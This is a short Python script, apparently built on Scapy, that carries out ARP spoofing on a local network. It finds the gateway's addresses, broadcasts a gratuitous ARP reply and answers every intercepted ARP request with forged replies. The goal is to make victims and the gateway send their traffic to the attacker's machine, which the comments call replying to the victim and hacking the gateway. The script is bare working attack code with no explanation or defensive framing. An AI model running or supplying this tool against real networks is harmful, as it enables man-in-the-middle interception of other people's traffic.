#my_ip = ARP().psrc
#my_mac = ARP().hwsrc

p = srp1(Ether()/IP(dst='1.2.3.4', ttl=0)/ICMP()/'abcdefgh')

gw_ip = p.payload.src
gw_mac = p.src
my_ip = p.payload.dst
my_mac = p.dst

print('My IP:', my_ip)
print('My MAC:', my_mac)
print('Gateway IP:', gw_ip)
print('Gateway Real MAC:', gw_mac)

def packet_cb(p):
  p = p.payload
  if p.op != 1: # only who-has
    return
  if p.psrc == my_ip:
    return
  if p.pdst == gw_ip:
    print('{} at {} is requesting gateway\'s MAC...'.format(p.psrc, p.hwsrc))
    do_reply(gw_ip, p.hwsrc, p.psrc) # reply to victim
    do_reply(p.psrc, gw_mac, gw_ip) # hack gateway
  elif p.psrc == gw_ip:
    print('Gateway is requesting {}\'s MAC...'.format(p.pdst))
    do_reply(p.pdst, p.hwsrc, p.psrc) # reply to gateway

def do_reply(fake_ip, dst, pdst=''):
  if dst == 'ff:ff:ff:ff:ff:ff':
    # gratuitous ARP
    hwdst = my_mac
    pdst = fake_ip
  else:
    hwdst = dst
  packet = Ether(dst=dst)/ARP(op='is-at',
                       hwsrc=my_mac,
                       psrc=fake_ip,
                       hwdst=hwdst,
                       pdst=pdst)
  print('new packet:')
  packet.show()
  sendp(packet * 3)

def main():
  do_reply(gw_ip, 'ff:ff:ff:ff:ff:ff') # gratuitous ARP
  while True:
    receive = sniff(filter='arp', count=100, prn=packet_cb)

main()
exit()
